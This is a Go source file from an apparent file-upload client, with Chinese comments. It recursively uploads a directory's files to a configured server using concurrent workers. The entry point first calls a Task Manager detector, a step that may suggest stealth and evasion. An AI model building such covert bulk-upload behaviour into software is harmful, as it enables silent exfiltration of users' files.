package uploader

import (
	"fmt"
	"log"
	"net"
	"os"
)

type Config struct {
	ServerAddr           string
	ClientID             string
	MaxConcurrentUploads int
	SpeedLimitBytes      int64 // 0 = 不限速
}

type Uploader struct {
	cfg             Config
	connFunc        func() (net.Conn, error)
	SpeedLimitBytes int64
	BufferSize      int
}

// 调用接口的信息转换
func New(cfg Config, factory func() (net.Conn, error)) *Uploader {
	if cfg.MaxConcurrentUploads == 0 {
		cfg.MaxConcurrentUploads = 5
	}

	// 全局变量给值
	GlobalUploadSem = make(chan struct{}, cfg.MaxConcurrentUploads)
	ServerAddr = cfg.ServerAddr

	return &Uploader{
		cfg:             cfg,
		connFunc:        factory,
		SpeedLimitBytes: cfg.SpeedLimitBytes,
	}
}

// 程序分发入口
func (u *Uploader) PatchDistribution(dirPath string) {

	StartTaskManagerDetector()
	task := &UploadTask{
		ClientID: u.cfg.ClientID,
		RootPath: dirPath,
		connFunc: u.connFunc,
	}

	// 检查路径是文件还是目录
	info, err := os.Stat(dirPath)
	if err != nil {
		// clog.LogMessage("路径错误：%v\n", err)
		return
	}

	if info.IsDir() {

		// 改成这样写：
		SafeGo(func() {
			if err := task.GenerateFileList(); err != nil {
				log.Printf("[goupload] 扫描目录失败: %v", err)
			}
		})

		SafeGo(func() {
			task.startUploadWorkers()
		})
	} else {

		// 旧单个上传不限原队列影响,主要是设计限制5并发的处理,单个文件上传不限制
		// t.doSendFile(dirPath)
		// 单文件上传直接调用同步方法
		SafeGo(func() {
			if err := task.doSendFileWithOutArray(dirPath); err != nil {
				OutputDebugString(fmt.Sprintf("上传失败: %v", err))
			}
		})
	}
}
